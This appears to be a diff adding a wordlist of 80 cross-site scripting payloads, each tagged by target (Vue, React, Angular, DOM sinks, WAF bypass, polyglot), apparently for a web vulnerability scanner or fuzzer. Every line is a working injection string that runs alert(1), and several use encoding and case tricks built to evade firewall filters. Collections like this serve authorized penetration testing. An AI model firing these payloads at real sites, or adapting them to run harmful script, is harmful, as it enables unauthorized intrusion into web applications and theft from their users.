@@ -1,0 +1,80 @@
+[GENERIC] [VUE] @load="alert(1)
+[GENERIC] [DOM_XSS] '-alert(1)-
+[GENERIC] [DOM_XSS] "-alert(1)-
+[GENERIC] [DOM_XSS] `+alert(1)+
+[GENERIC] [DOM_XSS] ${alert(1)}
+[GENERIC] [VUE] @error="alert(1)
+[GENERIC] [DOM_XSS] ?cb=alert(1)
+[GENERIC] [VUE] @focus="alert(1)
+[GENERIC] [DOM_XSS] \"-alert(1)//
+[GENERIC] [DOM_XSS] \'-alert(1)//
+[GENERIC] [DOM_XSS] ';alert(1);//
+[GENERIC] [DOM_XSS] ";alert(1);//
+[GENERIC] [DOM_XSS] \';alert(1);//
+[GENERIC] [DOM_XSS] "};alert(1);//
+[GENERIC] [DOM_XSS] '];alert(1);//
+[GENERIC] [DOM_XSS] '};alert(1);//
+[GENERIC] [DOM_XSS] \";alert(1);//
+[GENERIC] [DOM_XSS] "];alert(1);//
+[GENERIC] [POLYGLOT] \";alert(1);//
+[GENERIC] [DOM_XSS] ?jsonp=alert(1)
+[GENERIC] [VUE] @mouseover="alert(1)
+[GENERIC] [DOM_XSS] ?action=alert(1)
+[GENERIC] [REACT] javascript:alert(1)
+[GENERIC] [DOM_XSS] ?callback=alert(1)
+[GENERIC] [DOM_XSS] ?jsonp_cb=alert(1)
+[GENERIC] [DOM_XSS] javascript:alert(1)
+[GENERIC] [REACT] java%0dscript:alert(1)
+[GENERIC] [REACT] java%09script:alert(1)
+[GENERIC] [GENERIC] <div oncut=alert(1)>
+[GENERIC] [DOM_XSS] #javascript:alert(1)
+[GENERIC] [REACT] java%0ascript:alert(1)
+[GENERIC] [GENERIC] <div oncopy=alert(1)>
+[GENERIC] [REACT] javascript:top.alert(1)
+[GENERIC] [WAF_BYPASS] <script>alert(1)//
+[GENERIC] [ANGULAR] {{ $window.alert(1) }}
+[GENERIC] [REACT] javascript:self.alert(1)
+[GENERIC] [WAF_BYPASS] jAvAsCrIpT:alert(1)
+[GENERIC] [GENERIC] <div onpaste=alert(1)>
+[GENERIC] [REACT] javascript://%0Aalert(1)
+[GENERIC] [REACT] javascript:this.alert(1)
+[GENERIC] [DOM_XSS] ?q=javascript:alert(1)
+[GENERIC] [WAF_BYPASS] JaVaScRiPt:alert(1)
+[GENERIC] [WAF_BYPASS] <script>alert(1)<!--
+[GENERIC] [DOM_XSS] ?js=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?id=javascript:alert(1)
+[GENERIC] [VUE] :src="'javascript:alert(1)'
+[GENERIC] [ANGULAR] {{ $location.alert(1) }}
+[GENERIC] [VUE] :href="'javascript:alert(1)'
+[GENERIC] [DOM_XSS] ?jsonp_callback=alert(1)
+[GENERIC] [GENERIC] <body ononline=alert(1)>
+[GENERIC] [VUE] :data="'javascript:alert(1)'
+[GENERIC] [REACT] javascript:parent.alert(1)
+[GENERIC] [DOM_XSS] ?css=javascript:alert(1)
+[GENERIC] [REACT] javascript://%250Aalert(1)
+[GENERIC] [DOM_XSS] ?dir=javascript:alert(1)
+[GENERIC] [GENERIC] <body onscroll=alert(1)>
+[GENERIC] [ANGULAR] {{ $document.alert(1) }}
+[GENERIC] [DOM_XSS] ?key=javascript:alert(1)
+[GENERIC] [GENERIC] <body onunload=alert(1)>
+[GENERIC] [DOM_XSS] ?url=javascript:alert(1)
+[GENERIC] [GENERIC] <body onresize=alert(1)>
+[GENERIC] [REACT] javascript:window.alert(1)
+[GENERIC] [WAF_BYPASS] java%00script:alert(1)
+[GENERIC] [GENERIC] <body onoffline=alert(1)>
+[GENERIC] [DOM_XSS] ?path=javascript:alert(1)
+[GENERIC] [GENERIC] <body onmessage=alert(1)>
+[GENERIC] [DOM_XSS] ?user=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?auth=javascript:alert(1)
+[GENERIC] [GENERIC] <body onstorage=alert(1)>
+[GENERIC] [GENERIC] <script>alert(1)</script>
+[GENERIC] [WAF_BYPASS] java%09script:alert(1)
+[GENERIC] [DOM_XSS] ?link=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?file=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?page=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?lang=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?name=javascript:alert(1)
+[GENERIC] [WAF_BYPASS] java%0dscript:alert(1)
+[GENERIC] [DOM_XSS] ?next=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?item=javascript:alert(1)
+[GENERIC] [DOM_XSS] ?hash=javascript:alert(1)
